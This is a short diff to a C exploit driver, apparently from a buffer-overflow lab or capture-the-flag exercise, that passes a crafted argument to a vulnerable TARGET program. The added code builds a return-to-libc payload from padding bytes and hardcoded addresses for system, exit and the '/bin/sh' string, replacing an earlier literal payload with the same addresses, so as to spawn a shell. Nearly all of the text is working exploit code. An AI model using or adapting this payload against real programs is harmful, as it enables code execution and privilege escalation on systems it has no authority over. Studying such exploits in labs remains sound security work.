@@ -12,8 +12,22 @@ int main(void)
   char *args[3]; 
   char *env[1];
   
+  char str[20];
+  memset(str, 0, 20);
+  for (int i = 0; i < 8; i++)
+  {
+  	strcat(str, "\x90");
+  }  
+  char *system = "\xb0\x2d\xe4\xb7";
+  char *exit = "\xe0\x69\xe3\xb7";
+  char *bin_sh = "\x2b\x3b\xf6\xb7";
+
+  strcat(str, system);
+  strcat(str, exit);
+  strcat(str, bin_sh);
+
   args[0] = TARGET;
-  args[1] = "AAAAAAAA\xb0\x2d\xe4\xb7\x90\x90\x90\x90\x2b\x3b\xf6\xb7"; 
+  args[1] = str; 
   args[2] = NULL;
   
   env[0] = NULL;
